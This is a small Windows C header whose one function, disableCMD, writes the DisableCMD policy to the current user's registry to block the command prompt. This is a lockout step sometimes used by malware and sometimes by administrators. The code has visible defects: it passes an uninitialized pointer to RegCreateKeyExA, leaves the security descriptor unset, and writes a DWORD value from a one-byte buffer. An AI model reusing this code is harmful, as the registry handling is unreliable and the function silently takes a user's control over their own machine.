#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include "boolean.h"

#ifndef DISABLE_CMD
#define DISABLE_CMD

bool disableCMD() {
    HKEY hKey;
    LPDWORD doneOperation;
    SECURITY_ATTRIBUTES attrs;
    LPCTSTR sk = TEXT("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
    long openedKeyWorked = RegOpenKeyExA(HKEY_CURRENT_USER, sk, 0, KEY_ALL_ACCESS, &hKey);
    
    if (openedKeyWorked != ERROR_SUCCESS) {
        attrs.nLength = sizeof(SECURITY_ATTRIBUTES);
        attrs.bInheritHandle = TRUE;

        openedKeyWorked = RegCreateKeyExA(HKEY_CURRENT_USER, sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &attrs, &hKey, doneOperation);
    }
    LPCSTR value = TEXT("DisableCMD");
    BYTE data = 1;

    long settingWorked = RegSetValueExA(hKey, value, 0, REG_DWORD, &data, 1);

    if (settingWorked != ERROR_SUCCESS) {
        printf("An error occured while setting the value of the DisableCMD value");
        return false;
    }

    long closingWorked = RegCloseKey(hKey);

    if (closingWorked != ERROR_SUCCESS) {
        printf("An error occured while closing the hKey");
        return false;
    }

    return true;
}

#endif